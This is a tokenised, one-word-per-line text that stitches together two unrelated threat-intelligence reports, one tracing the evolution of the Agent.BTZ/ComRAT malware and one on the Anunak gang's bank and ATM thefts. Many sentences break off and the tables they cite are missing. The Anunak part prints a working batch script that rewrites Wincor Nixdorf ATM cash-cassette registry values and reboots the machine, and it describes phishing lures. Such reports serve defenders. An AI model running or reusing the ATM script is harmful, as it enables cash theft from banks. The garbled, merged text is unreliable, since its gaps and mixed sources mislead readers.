In
November
2014
,
the
experts
of
the
G
DATA
SecurityLabs
published
an
article
about
ComRAT
,
the
Agent
.
BTZ
successor
.

We
explained
that
this
case
is
linked
to
the
Uroburos
rootkit
.

We
assume
that
the
actor
behind
these
campaigns
uses
several
different
malware
strains
is
order
to
compromise
the
targeted
infrastructure
:
Uroburos
,
a
rootkit
;
Agent
.
BTZ
/
ComRAT
,
remote
administration
tools
or
Linux
malware
and
maybe
even
more
.

We
decided
to
have
an
even
closer
look
at
Agent
.
BTZ
and
ComRAT
and
therefore
analyzed
the
evolution
of
this
RAT
,
covering
seven
years
of
development
.

Here
is
a
table
with
the
minimal
information
about
46
different
samples
.

Thanks
to
the
versioning
,
we
can
deduce
that
the
compilation
dates
we
saw
and
currently
see
actually
seem
to
be
legit
–
except
for
the
last
known
version
,
in
which
the
author
modified
the
compilation
date
in
order
to
make
the
analysis
more
complex
.

We
can
see
that
this
malware
was
really
active
in
2007
and
2008
.

New
versions
declined
in
frequency
in
2009
and
only
one
new
sample
was
identified
in
2010
.

We
did
not
encounter
any
new
sample
from
2011
,
but
the
malware
appeared
back
in
2012
,
with
a
new
major
version
.

To
describe
the
evolution
of
the
development
,
we
decided
to
compare
ten
major
versions
.

The
following
chapter
will
present
the
main
differences
between
the
versions
mentioned
above
.

Here
is
the
resemblance
ratio
for
each
version
,
comparing
direct
neighbor
versions
only
,
created
using
BinDiff
.

The
biggest
code
update
has
occurred
between
version
2.14.1
and
version
3.00
.

The
gap
matches
the
absence
of
samples
during
two
years
and
this
fundamental
modification
is
what
we
call
the
death
of
Agent
.
BTZ
and
the
birth
of
ComRAT
.

Differences
between
version
Ch
1.0
(
2007
-
06
)
to
Ch
1.5
(
2008
-
03
)
The
analyzed
samples
are
.

We
did
not
identify
strong
modification
between
the
two
samples
.

However
,
we
can
notice
the
following
.

Differences
between
version
Ch
1.5
(
2008
-
03
)
and
Ch
2.03
(
2008
-
05
)
The
analyzed
samples
are
.

In
version
2.03
of
Agent
.
BTZ
,
the
authors
changed
the
following
.

They
added
obfuscation
in
order
to
hide
sensitive
strings
;
The
communication
protocol
was
modified
in
order
to
include
the
flag
"
<
CHCMD
>
"
we
assume
that
"
CH
"
has
the
same
meaning
than
"
Ch
"
before
the
version
number
and
"
CMD
"
is
the
abbreviation
for
command
;
From
now
on
,
the
malware
supports
"
runas
"
in
order
to
execute
commands
as
administrator
.

This
command
was
implemented
by
Microsoft
in
Windows
Vista
in
2007
.

We
assume
that
the
author
implemented
this
feature
because
several
targets
switched
to
this
version
of
Windows
in
2008
.

According
to
an
article
,
version
1.5
was
used
against
the
US
Pentagon
.

We
assume
that
the
string
obfuscation
was
performed
in
order
to
bypass
security
measures
being
capable
of
detecting
an
intrusion
.

Differences
between
version
Ch
2.03
(
2008
-
05
)
and
Ch
2.11
(
2009
-
09
)
The
analyzed
samples
are
.

The
codes
of
these
two
versions
are
extremely
similar
to
each
other
,
we
can
only
notice
small
changes
.

Differences
between
version
Ch
2.11
(
2009
-
09
)
and
Ch
2.14.1
(
2010
-
02
)
The
analyzed
samples
are
.

These
codes
are
really
similar
to
each
other
,
too
.

We
can
notice
only
two
changes
.

The
four
exported
libraries
show
that
the
malware
has
started
to
support
the
OLE
Component
Object
Model
(
COM
)
.

This
version
is
the
first
version
able
to
be
registered
as
a
COM
object
.

Three
of
the
four
functions
are
empty
.

The
fourth
one
executes
the
malware
.

Differences
between
version
2.14.1
(
2010
-
02
)
and
Ch
3.00
(
2012
-
01
)
The
analyzed
samples
are
.

These
codes
really
differ
from
each
other
,
even
if
some
parts
of
version
2.14.1
were
retained
.

Moreover
,
the
developers
changed
the
compiler
;
they
switched
from
Visual
Studio
6.0
to
Visual
Studio
9.0/10.0
,
which
is
a
strong
indicator
for
the
huge
differences
.
Version
3.00
is
what
the
G
DATA
SecurityLabs
experts
call
ComRAT
.

We
can
say
that
version
2.14.1
is
the
last
version
of
Agent
.
BTZ
.

Here
are
the
main
differences
between
Agent
.
BTZ
and
ComRAT
.

On
several
3.00
samples
,
the
author
forgot
to
remove
the
compilation
path
,
here
are
some
examples
.

Thanks
to
these
compilation
paths
,
we
assume
that
the
original
name
of
the
RAT
is
"
Chinch
"
,
which
leads
us
to
the
assumption
that
the
"
CH
"
characters
in
the
version
name
and
in
the
flag
"
<
CHCMD
>
"
stands
for
"
Chinch
"
.

In
English
,
chinch
is
the
word
for
a
small
North
American
bug
,
Blissus
leucopterus
.

This
word
is
derived
from
the
Spanish
word
chinche
,
meaning
pest
.

Differences
between
version
3.00
(
2012
-
01
)
and
Ch
3.10
(
2012
-
12
)
The
analyzed
samples
are
.

The
codes
are
similar
to
each
other
,
but
the
authors
added
several
features
.

The
last
new
feature
is
really
interesting
:
if
the
compromised
targets
block
a
specific
command
and
control
server
,
the
malware
will
continue
to
work
,
thanks
to
two
alternative
command
and
control
servers
.

Differences
between
version
3.10
(
2012
-
12
)
and
Ch
3.20
(
2013
-
06
)
The
analyzed
samples
are
.

The
major
new
feature
in
the
version
is
the
new
exports
function
called
InstallW
(
)
.

This
exported
function
is
used
by
the
dropper
to
add
persistence
in
the
registry
and
to
drop
a
second
file
(
as
explained
in
our
previous
article
)
.

Version
3.20
uses
the
following
CLSID
in
order
to
hijack
COM
object
:
B196B286-BAB4-
101A
-
B69C-00AA00341D07
.

This
object
is
the
IConnectionPoint
interface
.

The
CLSID
was
only
used
in
this
version
.

We
assume
that
the
performed
COM
object
hijacking
generates
some
trouble
on
the
infected
system
,
that
's
why
the
author
changed
related
things
in
the
next
version
.

Furthermore
,
the
CLSID
was
stored
in
plain
text
within
the
sample
.

Differences
between
version
Ch
3.20
(
2013
-
06
)
and
Ch
3.25
(
2014
-
02
)
The
analyzed
samples
are
.

In
the
3.25
version
,
the
author
switched
to
the
CLSID
:
42aedc87
-
2188
-
41fd
-
b9a3
-
0c966feabec1
as
described
in
our
article
.

Furthermore
,
the
strings
in
the
sample
are
obfuscated
.

The
main
new
feature
is
the
obfuscation
–
almost
all
strings
are
obfuscated
and
the
XML
pattern
is
not
written
in
plain
text
anymore
.

Differences
between
version
Ch
3.25
(
2014
-
02
)
and
Ch
3.26
(
2013
-
01
;
date
has
been
modified
)
The
analyzed
samples
are
.

The
version
3.26
is
the
latest
known
version
.

In
this
version
.

This
analysis
shows
us
seven
years
of
the
evolution
of
a
Remote
Administration
Tool
,
used
by
a
group
which
targeted
extremely
sensitive
entities
,
such
as
the
US
Pentagon
in
2008
or
the
Belgium
Ministry
of
Foreign
Affairs
in
2014
as
well
as
the
Finnish
Ministry
of
Foreign
Affairs
.

Except
for
version
3.00
,
the
modifications
made
are
rather
marginal
.

We
can
see
that
the
authors
adapted
features
to
the
Windows
versions
,
patched
bugs
,
added
obfuscation
etc
…
The
biggest
update
was
performed
to
version
3.00
,
after
two
years
of
silence
.

Visibly
,
this
RAT
was
used
alongside
the
Uroburos
rootkit
.

Nevertheless
,
it
is
not
entirely
clear
how
and
when
the
attackers
choose
to
use
the
RAT
or
the
rootkit
or
whether
both
are
used
in
parallel
.

Taking
everything
into
consideration
,
G
DATA
SecurityLabs
experts
are
sure
that
the
group
behind
Uroburos
/
Agent
.
BTZ
/
ComRAT
/
Linux
tool/
…
will
remain
an
active
player
in
the
malware
and
APT
field
.

The
newest
revelations
made
and
connections
drawn
let
us
believe
that
there
is
even
more
to
come
.

Hereby
Group
-
IB
and
Fox
-
IT
inform
that
:
This
report
describes
the
details
and
type
of
op-
erations
carried
out
by
an
organized
criminal
group
that
focuses
on
financial
industry
,
such
as
banks
and
payment
providers
,
retail
industry
and
news
,
media
and
PR
companies
.

The
group
has
its
origin
in
more
common
financial
fraud
including
theft
from
con-
sumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.

After
the
arrests
of
Carberp
group
members
in
Russia
,
some
of
the
members
were
out
of
work
,
however
,
their
experience
gained
from
many
years
of
crime
has
allowed
them
to
enter
a
new
niche
.

One
of
the
members
quickly
realized
that
they
can
steal
$
2000
a
thousand
times
,
and
earn
$
2
million
,
but
also
they
can
steal
it
in
one
time
and
immediately
get
it
with
much
less
effort
.

The
anti
-
fraud
measures
employed
by
banks
has
pushed
the
criminals
to
search
for
new
ways
to
make
money
with
less
bar-
riers
,
compromising
and
modifying
or
taking
data
from
banks
,
payment
providers
,
retail
and
media/
PR
companies
are
some
of
these
methods
.

From
2013
an
organized
criminal
group
intensi-
fied
its
activity
focused
on
banks
and
electronic
pay-
ment
systems
in
Russia
and
in
the
post
-
Soviet
space
.

The
key
is
that
fraud
occurs
within
the
corporate
network
using
internal
payment
gateways
and
in-
ternal
banking
systems
.

Thus
money
is
stolen
from
the
banks
and
payment
systems
,
and
not
from
their
customers
.

While
this
is
their
main
and
most
lucra-
tive
activity
,
the
gang
has
also
ventured
into
other
areas
including
the
compromise
of
media
groups
and
other
organizations
for
industrial
espionage
and
likely
a
trading
advantage
on
the
stock
market
.

In
cases
where
the
group
got
access
to
the
government
agency
networks
their
aim
was
espionage
related
.

The
organized
criminal
group
backbone
are
citizens
of
both
Russian
and
Ukrainian
origin
,
but
the
group
also
sources
a
number
of
mainstream
and
specialized
services
from
individuals
and
groups
originating
from
Russia
,
Ukraine
and
Belarus
.

The
average
sum
of
theft
in
the
Russian
terri-
tory
and
in
the
post
-
Soviet
space
is
$
2
million
per
incident
.

Since
2013
they
have
successfully
gained
access
to
networks
of
more
than
50
Russian
banks
and
5
payment
systems
,
and
2
of
these
institutions
were
deprived
of
their
banking
license
.

To
date
the
total
amount
of
theft
is
over
1
billion
rubles
(
about
25
million
dollars
)
,
most
of
it
has
been
stolen
in
the
second
half
of
2014
.

The
average
time
from
the
moment
of
penetration
into
the
financial
institutions
internal
network
till
successful
theft
is
42
days
.

As
a
result
of
access
to
internal
bank
networks
the
attackers
also
managed
to
gain
access
to
ATM
management
infrastructure
and
infect
those
sys-
tems
with
their
own
malicious
software
that
further
allows
theft
from
the
banks
ATM
systems
on
the
attackers
command
.

Since
2014
the
organized
criminal
group
mem-
bers
began
actively
taking
an
interest
in
US
and
Eu-
ropean
based
retail
organizations
.

While
they
were
already
familiar
with
POS
malware
and
compromis-
ing
POS
terminals
,
the
widespread
media
attention
around
the
Target
breach
and
other
related
breaches
were
the
reason
for
this
move
.

While
the
scale
of
breaches
in
this
industry
is
still
relatively
low
,
with
at
least
3
successful
card
breaches
and
over
a
dozen
retailers
compromised
this
activity
is
quickly
becom-
ing
a
lucrative
endeavor
for
this
group
.

To
penetrate
into
the
internal
networks
this
organized
criminal
group
employs
targeted
emailing
(
spear
phishing
)
and
infections
sources
from
other
botnets
.

This
is
the
main
reason
why
the
group
is
keeping
in
touch
with
owners
of
large
botnets
.

Since
August
2014
the
group
began
to
create
their
own
large
botnet
using
a
mass
emailing
,
but
not
using
typical
exploit
driveby
infections
.

This
last
move
is
likely
to
reduce
the
need
for
external
contacts
.

The
first
successful
bank
robbery
was
committed
by
this
group
in
January
2013
.

In
all
first
cases
the
attackers
used
the
program
RDPdoor
for
remote
access
to
the
bank
network
and
the
program
"
MBR
Eraser
"
to
remove
traces
and
to
crack
Windows
computers
and
servers
.

Both
programs
were
used
by
the
members
of
the
Carberp
criminal
group
under
the
guidance
of
a
person
named
Germes
.

To
reduce
the
risk
of
losing
access
to
the
internal
bank
network
the
attackers
,
in
addition
to
malicious
programs
,
were
also
used
for
remote
access
legitimate
pro-
grams
such
as
Ammy
Admin
and
Team
Viewer
.

Lat-
er
the
attackers
completely
abandoned
from
usage
of
RDPdoor
and
Team
Viewer
.

In
addition
to
banking
and
payment
systems
,
hackers
got
access
to
e
-
mail
servers
to
control
all
internal
communications
.

This
approach
allowed
them
to
find
out
that
the
anomalous
activity
in
the
bank
network
was
identified
,
what
technique
was
used
to
identify
this
activity
and
what
measures
the
bank
employees
took
to
solve
the
problem
.

Email
control
was
successfully
installed
regardless
of
used
email
system
,
MS
Exchange
or
Lotus
.

This
approach
allowed
them
to
take
countermeasures
that
created
for
bank
and
payment
system
employees
the
feeling
that
the
problem
had
been
solved
.

The
main
steps
of
the
attack
progression
are
the
following
ones
:
To
carry
out
target
attacks
in
2014
the
hackers
have
finalized
development
of
their
core
malware
Anunak
that
is
used
along
with
the
following
tools
.

According
to
our
laboratory
classification
the
main
malware
is
"
Anunak
"
.

This
trojan
is
used
for
target
attacks
only
,
mainly
on
banks
and
payment
systems
.

Target
usage
of
this
program
allows
it
to
remain
poorly
explored
,
providing
it
a
good
surviv-
ability
inside
corporate
networks
.

The
source
code
of
the
bank
trojan
program
Carberp
was
used
in
some
places
of
this
malware
.

"
Anunak
"
has
the
following
feature
set
.

There
is
the
ability
to
download
arbitrary
exe-
cutable
files
from
the
management
server
and
run
them
.

One
of
these
files
is
the
program
"
AmmyAd-
min
"
that
may
be
run
with
the
arguments
"
-service
"
and
"
-nogui
"
that
force
it
to
start
as
a
service
without
user
interface
.

"
AmmyAdmin
"
allows
to
connect
with
another
computer
that
has
the
same
software
through
the
server
"
rl.ammyy.com
"
using
the
IP
address
and
the
unique
identifier
.

As
a
result
,
the
attacker
gets
remote
access
to
the
user
computer
with
the
running
program
"
AmmyAdmin
"
bypassing
firewalls
.

The
window
screenshot
is
shown
in
the
figure
below
.

When
the
attackers
gain
access
to
servers
running
operating
systems
of
the
Linux
family
they
use
SSH
backdoor
that
transmits
to
the
malicious
server
the
login
/
password
data
used
to
access
the
servers
and
provides
attackers
remote
access
to
the
servers
.

To
provide
access
to
the
server
of
interest
the
at-
tackers
may
appropriately
modify
rules
for
firewalls
Microsoft
TMG
,
CISCO
,
etc
.

When
the
attackers
yet
had
no
major
malware
that
would
secretly
install
the
program
"
AmmyAd-
min
"
and
report
to
the
attackers
a
remote
access
password
,
they
used
a
malicious
program
known
as
"
Barus
"
.

This
malware
is
used
rarely
and
the
last
time
we
met
it
in
2013
.

This
malicious
program
is
developed
by
Russian
-
speaking
authors
.

In
the
control
panel
you
can
notice
a
field
"
Ammy
ID
"
,
its
usage
allowed
the
attackers
to
connect
remotely
.

At
the
very
beginning
of
their
activity
in
2013
due
to
lack
of
the
target
Trojan
the
attackers
began
to
distribute
Andromeda
and
Pony
.

They
distributed
these
malware
using
Driveby
through
a
bunch
of
Neutrino
Exploit
Kit
exploits
as
shown
in
the
figure
below
.

It
is
interesting
that
in
the
autumn
2013
they
used
the
site
http://php.net/
as
traffic
source
to
Magnitude
EK
.

They
redirected
the
traffic
from
this
resource
since
July
2013
,
but
this
fact
was
discov-
ered
much
later
.

The
name
of
one
of
the
streams
to
distribute
the
malware
is
"
LOL
BANK
FUCKIUNG
"
that
corresponded
to
the
attacker
activities
.

Parallel
to
this
technique
they
also
use
another
infection
method
,
which
was
one
of
the
principal
methods
.

The
main
method
of
distribution
is
send-
ing
emails
with
malicious
attachments
on
behalf
of
the
Central
Bank
of
the
Russian
Federation
,
a
poten-
tial
client
or
an
real
counterparty
(
at
first
the
attack-
ers
had
cracked
this
counterparty
account
,
then
they
used
emailing
with
the
cracked
contact
list
)
.

Another
used
method
is
to
install
a
special
malware
to
carry
out
targeted
attacks
via
another
malware
that
might
appear
in
the
local
network
by
accident
.

To
find
such
malicious
programs
the
criminal
group
keeps
in
touch
with
several
owners
of
large
botnets
that
massively
distributes
their
mal-
ware
.

The
attackers
buy
from
these
botnet
owners
the
information
about
IP
-
addresses
of
computers
where
the
botnet
owners
have
installed
malware
and
then
check
whether
the
IP
-
address
belongs
to
the
financial
and
government
institutions
.

If
the
mal-
ware
is
in
the
subnet
of
interest
,
the
attackers
pay
the
large
botnet
owner
for
installation
of
their
target
malware
.

Such
partner
relations
were
established
with
owners
of
botnets
Zeus
,
Shiz
Ranbyus
.

All
of
these
trojans
are
bank
Trojans
,
their
usage
is
ex-
plained
by
the
previously
established
relationships
.

In
late
2013
the
hacker
under
the
alias
Dinhold
be-
gan
to
build
his
own
botnet
using
modified
Carberp
,
having
uploaded
its
source
code
for
public
access
.

The
attackers
were
trying
to
create
similar
relations
with
this
hacker
,
but
in
2014
he
was
arrested
,
having
not
developed
his
botnet
up
to
the
required
level
.

To
check
whether
the
IP
-
address
belongs
to
the
desired
network
the
following
script
is
used
.

The
most
dangerous
emailings
are
those
that
are
sent
on
behalf
of
partners
with
whom
financial
and
government
institutions
communicates
permanently
by
email
.

An
example
of
such
emailing
occurred
on
Septem-
ber
25
,
2014
,
at
14:11
,
from
the
e
-
mail
address
"
Elina
Shchekina
<
e.shekina@rbkmoney.com
>
"
with
the
subject
"
Updated
agree-
ment
version
"
.

The
attachment
"
agreement.doc
"
exploits
the
vul-
nerability
CVE-2012
-
2539
and
CVE-2012
-
0158
.

The
emailing
was
conducted
for
more
than
70
addresses
of
various
compa-
nies
(
where
multiple
recipient
addresses
may
be
within
one
company
)
.

The
letter
with
malicious
attachment
(
md5
:
AA36BA9F-
4DE5892F1DD427B7B2100B06
)
in
the
archive
with
a
password
from
a
potential
client
was
sent
to
a
bank
manager
after
a
pre-
liminary
telephone
conversation
with
him
.

The
call
origin
is
Saint
Petersburg
.

Contents
of
a
text
file
named
"
реквизиты.doc
"
(
partner
de-
tais.doc
)
"
Company
Our
Century
"
,
Ltd.

109387
,
Russia
,
Moscow
,
Anosov
str
.
,
24
,
office
409
Tel
.

(
495
)
124
-
99
-
77
Fax
:
(
495)124
-
99
-
77
Mobile
(
962
)
7135296
E
-
mail
:
x60x@nxt
.

ru
INN
7329001307
KPP
732901001
Account
40702810613310001709
Branch
of
VTB
24
(
JSC
)
,
Moscow
Correspondent
account
30101810700000000955
BIC
043602955
A
letter
on
behalf
of
the
Central
Bank
of
Russia
with
a
malicious
attachment
(
md5
:
8FA296EFAF87FF4D-
9179283D42372C52
)
exploited
the
vulnerability
CVE-2012-
2539
in
order
to
execute
arbi-
trary
code
.

There
were
also
other
exam-
ples
of
emails
with
malicious
attachments
,
such
as
emailing
with
the
file
"
001
.

photo.exe
"
.

A
more
detailed
list
of
such
attachments
you
can
see
in
the
Table
"
Email
attachments
"
.

Availability
of
access
to
bank
internal
networks
opens
great
opportunities
for
the
hackers
.

One
of
these
opportunities
is
access
to
ATMs
from
spe-
cial
network
segments
that
had
to
be
isolated
.

It
is
confirmed
that
this
criminal
group
gained
access
to
52
ATMs
.

The
amount
of
damage
exceeds
50
million
rubles
.

As
a
result
of
access
to
ATMs
,
depending
on
the
ATM
model
,
hackers
used
different
patterns
.

Having
access
,
the
attackers
downloaded
mali-
cious
scripts
and
changed
denominations
of
issued
banknotes
in
the
ATM
operating
system
registry
.

As
a
result
,
for
query
to
get
10
notes
with
denomination
of
100
roubles
the
attackers
received
10
banknotes
with
denomination
of
5,000
roubles
.

The
used
malicious
script
and
program
were
developed
for
the
platform
Wincor
.

The
malicious
script
contains
the
following
commands
.

Contents
of
the
file
"
1.bat
"
REG
ADD
"
HKEY_LOCAL_MACHINE\SOFTWARE\
Wincor
Nixdorf\ProTopas\CurrentVersion\LYNX-
PAR\CASH_DISPENSER
"
/v
VALUE_1
/t
REG_SZ
/d
"
5000
"
/f
REG
ADD
"
HKEY_LOCAL_MACHINE\SOFTWARE\
Wincor
Nixdorf\ProTopas\CurrentVersion\LYNX-
PAR\CASH_DISPENSER
"
/v
VALUE_2
/t
REG_SZ
/d
"
1000
"
/f
REG
ADD
"
HKEY_LOCAL_MACHINE\SOFTWARE\
Wincor
Nixdorf\ProTopas\CurrentVersion\LYNX-
PAR\CASH_DISPENSER
"
/v
VALUE_3
/t
REG_SZ
/d
"
500
"
/f
REG
ADD
"
HKEY_LOCAL_MACHINE\SOFTWARE\
Wincor
Nixdorf\ProTopas\CurrentVersion\LYNX-
PAR\CASH_DISPENSER
"
/v
VALUE_4
/t
REG_SZ
/d
"
100
"
/f
REG
ADD
"
HKEY_LOCAL_MACHINE\SOFTWARE\
Wincor
Nixdorf\ProTopas\CurrentVersion\LYNX-
PAR\CASH_DISPENSER
"
/v
VALUE_1
/t
REG_SZ
/d
"
100
"
/f
REG
ADD
"
HKEY_LOCAL_MACHINE\SOFTWARE\
Wincor
Nixdorf\ProTopas\CurrentVersion\LYNX-
PAR\CASH_DISPENSER
"
/v
VALUE_4
/t
REG_SZ
/d
"
5000
"
/f
shutdown
-r
-t
0
–f
Execution
of
this
file
changed
registry
keys
in
the
registry
branch
"
"
HKEY_LOCAL_MACHINE\
SOFTWARE\Wincor
Nixdorf\ProTopas\Current-
Version\LYNXPAR\CASH_DISPENSER
"
"
that
are
responsible
for
cassette
denominations
in
an
ATM
.

As
a
result
of
this
file
execution
the
registry
key
that
is
in
charge
of
the
cassette
number
1
(
VALUE_1
)
is
takes
the
value
"
100
"
,
and
the
registry
key
respon-
sible
for
the
cassette
number
4
(
VALUE_4
)
is
set
to
"
5000
"
.

Then
the
command
to
restart
the
computer
is
issued
.

The
registry
key
reference
values
:
If
the
ATM
actual
load
corresponds
to
the
refer-
ence
one
and
registry
keys
have
been
changed
,
then
the
banknotes
from
the
cassette
No.1
will
be
issued
with
denomination
"
5000
"
instead
of
"
100
"
.

In
addition
,
the
attackers
used
a
modified
debug
program
that
allows
by
the
command
to
issue
mon-
ey
from
the
dispenser
.

The
original
debug
program
issues
money
through
the
dispenser
only
when
the
open
ATM
housing
and
the
vault
door
are
fixed
.

In
order
to
ensure
money
issuance
from
the
closed
ATM
the
attackers
had
to
modify
the
original
program
"
KDIAG32
"
(
the
original
file
:
size
of
1,128,960
MD5
4CC1A6E049942EB-
DA395244C74179EFF
)
.

A
comparison
of
the
original
version
of
the
pro-
gram
with
the
modified
version
showed
that
the
only
difference
is
in
ignoring
error
"
"
Door
not
opened
or
missing
!
"
"
.

The
figure
below
shows
an
error
message
that
will
be
never
displayed
to
the
user
in
the
file
under
investigation
.

All
traces
found
during
investigation
of
one
incident
showed
that
the
same
criminal
group
had
worked
.

Ammy
Admin
was
used
for
remote
access
,
the
same
SSHD
backdoor
was
installed
on
Unix
servers
and
,
In
addi-
tion
,
it
was
loaded
from
the
same
hacked
server
as
in
other
cases
of
trojan
Anunak
usage
.

However
,
in
this
case
Androm-
eda
is
used
as
the
main
trojan
instead
of
Anunak
.

The
man-
agement
servers
were
located
in
Kazakhstan
,
Germany
and
Ukraine
.

Check
of
the
manage-
ment
servers
showed
that
it
was
the
hosting
Bulletproof
that
,
in
addition
to
servers
,
provides
a
service
of
traffic
proxying
through
its
infrastructure
as
well
as
TOR
and
VPN
usage
,
so
this
pattern
is
significantly
differs
from
the
Anunak
host-
ing
patern
.

Check
of
money
cashout
showed
that
the
same
cashout
criminal
group
had
worked
as
for
Anunak
and
this
fact
again
confirmed
their
cooperation
.

Obtained
Andromeda
trojan
copies
were
being
distributed
from
August
2014
by
e
-
mail
.

The
value
754037e7be8f61cbb1b85ab46c7da77d
,
which
is
the
MD5
hash
of
the
string
"
go
fuck
yourself
"
,
was
used
as
the
RC4
encryption
key
.

As
a
result
of
this
distri-
bution
from
August
to
late
October
the
Andromeda
botnet
rose
up
to
260,000
bots
.

Successful
infection
in
one
subnet
resulted
in
sending
such
letters
to
other
bank
employees
.

Example
of
forwarding
from
an
infected
bank
network
to
employees
of
another
bank
is
shown
below
.

As
a
result
of
this
radial
mailing
many
oil
and
gas
companies
,
banks
and
government
agencies
were
in-
fected
.

In
Russia
at
least
15
banks
and
two
payment
systems
were
infected
this
way
.

Letters
with
similar
attachments
were
being
dis-
tributed
with
the
following
subjects
:
"
My
new
photo
"
"
Alert
Transactions
Report
by
users
from
2014-
09
-
28
to
2014
-
09
-
28
"
Previously
,
it
should
be
noted
the
fact
that
the
process
of
stolen
money
withdrawal
(
cashout
)
was
differed
,
firstly
by
the
theft
method
,
secondly
by
the
victim
type
(
a
bank
or
a
payment
system
)
,
thirdly
by
the
total
stolen
sum
.

The
victims
by
their
type
were
divided
rather
by
counterparty
types
and
by
limitations
imposed
by
operation
with
the
counterparties
.

For
example
,
all
payments
were
required
to
go
through
a
certain
pool
of
mediators
.

In
addition
,
the
"
improper
"
pool
of
counterparties
could
cause
suspicion
and
unneces-
sary
testing
(
manual
processing
of
payment
orders
)
.

Bank
(
amounts
up
to
100
million
roubles
)
.

While
the
attacks
in
Russia
against
banks
and
payment
systems
have
occurred
over
the
past
two
years
,
the
attacks
against
the
retail
industry
is
only
something
which
started
in
the
second
quarter
of
2014
.

With
at
least
three
confirmed
breaches
where
card
track
data
was
obtainedand
a
total
of
at
least
16
breaches
at
retail
organizations
,
it
is
also
becoming
a
serious
threat
.

Apart
from
retail
organizations
it
is
also
known
that
a
number
of
media
and
PR
companies
have
been
breached
in
2014
.

While
it
is
not
entirely
cer-
tain
,
the
type
of
breaches
suggest
that
the
attackers
are
looking
for
inside
information
,
a
type
of
indus-
trial
espionage
,
allowing
them
to
gain
an
advantage
on
the
stock
market
.

As
there
is
nothing
specifically
missing
and
the
resulting
fraud
is
hard
to
match
with
anything
,
these
incidents
typically
are
never
linked
.

From
the
retail
perspective
,
the
first
infections
in
2014
were
sourced
from
a
botnet
which
employs
a
widely
deployed
crypto
-
currency
mining
malware
based
on
the
Gozi
/
ISFB
(
banking
)
malware
family
.

Based
on
our
insights
we
believe
during
the
first
half
of
2014
over
half
a
million
systems
had
been
compromised
by
this
malware
from
over
the
whole
world
,
however
Russia
and
a
number
of
post
-
Soviet
states
were
clean
of
infections
.

To
find
interesting
infections
within
this
large
set
of
compromised
systems
,
the
malware
extracts
relevant
information
from
the
systems
including
Microsoft
Windows
organization
registration
information
and
network/
Windows
domain
information
.

The
Gozi
/
ISFB
based
malware
was
used
to
drop
additional
components
on
interesting
systems
,
which
included
Metasploit
/
Meterpreter
payloads
and
Anunak
variants
.

This
was
one
of
the
main
methods
for
the
group
using
Anunak
to
obtain
in-
teresting
infections
in
the
middle
of
2014
,
sourcing
infections
from
other
botnet
operators
.
More
recent-
ly
other
infection
methods
,
including
spear
phishing
using
English
language
and
possibly
also
usage
of
the
teams
own
Andromeda
,
but
also
SQL
injection
to
breach
an
organization
directly
from
the
outside
,
has
been
employed
by
this
team
.

The
first
known
attacks
with
Anunak
targeted
a
specific
brand
of
POS
systems
which
revolved
around
the
Epicor
/
NSB
brand
.

To
do
this
Anunak
has
specific
code
to
target
POS
devices
equipped
with
this
software
,
which
in
contrary
to
the
more
common
memory
scanning
track
data
scrapers
,
logs
a
wealth
of
information
from
the
payments
done
by
the
cards
.

The
first
case
this
was
seen
active
was
in
July
2014
,
but
it
might
have
been
earlier
as
well
.

More
recent
breaches
have
used
a
new
custom
developed
POS
malware
,
which
is
a
more
simple
but
reliable
track
data
memory
scraper
.

The
initial
version
from
the
early
fall
of
2014
used
a
simple
blacklist
,
scraped
every
process
and
dumped
track
data
in
plain
text
.

More
recent
versions
scanned
only
configuration
specified
processes
and
used
RC4
to
encrypt
the
extracted
track
data
records
on
disk
.

While
the
retail
industry
is
one
of
its
main
targets
due
to
its
payment
processing
capabilities
,
other
compromises
might
occur
indirectly
,
for
example
to
obtain
databases
with
information
or
other
informa-
tion
that
is
of
value
to
the
organized
criminal
group
.

One
of
the
possibilities
is
obtaining
lists
of
corporate
email
addresses
to
have
a
higher
chance
of
interest-
ing
infections
.

At
this
moment
we
have
no
evidence
of
successful
compromise
or
theft
of
banks
and
payment
systems
outside
of
Russia
,
but
several
infections
in
the
east
of
Europe
(
specifically
Ukraine
and
Latvia
)
were
active
in
2014
.

These
specific
infections
were
related
to
infrastructure
of
organizations
based
in
Russia
or
with
significant
interests
in
Russia
,
thus
more
likely
related
to
the
breaches
at
the
same
organization
in
Russia
.

The
majority
of
infections
from
Europe
were
from
dedicated
servers
used
as
exit
node
for
VPN
services
,
the
systems
infected
were
likely
from
Eastern
Euro-
pean
or
Russian
origin
,
and
possibly
test
infections
from
the
attackers
.

We
have
no
evidence
of
compro-
mises
against
banks
in
Western
Europe
or
United
States
,
but
it
should
be
noted
that
the
attackers
methods
could
be
utilized
against
banks
outside
of
Russia
as
well
.

The
group
uses
Metasploit
as
one
of
their
main
hacking
tools
,
either
stand
alone
or
as
part
of
a
framework
.

The
activity
includes
port
scanning
and
system
reconnaissance
,
escalating
privileges
on
systems
by
using
for
example
the
recent
CVE-2014-
4113
vulnerability
,
gathering
credentials
and
hop-
ping
on
to
other
systems
and
networks
.

Metasploit
is
being
used
to
its
full
potential
with
scanning
,
exploiting
,
privilege
escalation
and
post
exploitation
persistence
being
achieved
with
its
standard
toolset
.

On
interesting
and
critical
systems
typical
hack-
ing
tools
might
be
found
to
establish
tunnels
out
of
the
network
,
either
tools
that
are
part
of
the
Metasploit
framework
such
as
Meterpreter
,
but
also
other
tools
to
achieve
persistence
on
those
systems
.

The
connect
back
methods
seen
are
typically
SSL
over
port
443
,
but
also
DNS
based
methods
were
observed
.

The
attackers
use
BITS
to
download
files
,
but
also
make
use
of
Windows
built
-
in
PowerShell
to
download
tools
and
execute
commands
.

Finally
on
the
critical
systems
freshly
crypted
and
non
-
detected
versions
of
Anunak
are
deployed
,
typically
these
are
used
in
very
limited
deployments
thus
their
spread
is
limited
and
detection
by
Anti
-
Virus
is
very
rare
.

Various
stealth
methods
including
the
aforemen-
tioned
backconnect
SSL
and
DNS
tunneling
for
compromise
persistence
and
data
exfiltration
are
used
.

The
Anunak
malware
has
multiple
ways
of
connecting
to
backends
,
which
includes
a
PHP
based
backend
reachable
over
HTTP
and
HTTPS
,
and
a
Windows
server
based
component
using
a
propri-
etary
protocol
.

The
use
of
VNC
scanning
and
password
brute
forcing
,
the
adding
of
additional
administrator
accounts
,
use
of
RDP
Wrapper
to
allow
concurrent
RDP
sessions
are
all
methods
to
gain
access
and
achieve
persistent
access
to
compromised
systems
employed
by
this
group
.

Additionally
various
ways
of
creating
incidental
and
regular
screen
captures
of
the
desktop
of
persons
of
interest
within
com-
promised
organizations
were
methods
employed
by
these
attackers
